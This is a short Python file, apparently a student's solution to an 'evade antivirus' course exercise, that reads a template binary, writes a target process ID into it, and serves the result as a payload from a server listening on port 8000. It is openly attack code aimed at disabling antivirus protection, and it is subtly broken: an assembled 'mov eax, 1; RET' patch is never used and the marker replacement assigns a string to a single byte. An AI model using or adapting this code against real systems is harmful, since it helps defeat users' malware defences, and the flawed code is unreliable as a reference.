import server
import struct
import assemble

PID_MARKER = 'abcd'
PATH = '/home/user/6/q2.template'

class SolutionServer(server.EvadeAntivirusServer):

	def get_payload(self, pid):
		patch = assemble.assemble_data('mov eax, 1; RET')
		padded_pid = "{0:#0{1}x}".format(pid,10)
		with open(PATH, "rb") as reader:
			data = reader.read()
			data = bytearray(data)
		pid_offset1 = data.find(str(PID_MARKER), 0)
		pid_offset2 = data.find(struct.pack('>s', PID_MARKER), 0)
		if pid_offset1 != -1:
			data[pid_offset1] = padded_pid
		elif pid_offset2 != -1:
			data[pid_offset2:pid_offset2 + len(padded_pid)] = padded_pid
		return data


	def print_handler(self, payload, product):
		print(product)

	def evade_antivirus(self, pid):
		self.add_payload(
			self.get_payload(pid),
			self.print_handler)


if __name__ == '__main__':
	SolutionServer().run_server(host='0.0.0.0', port=8000)

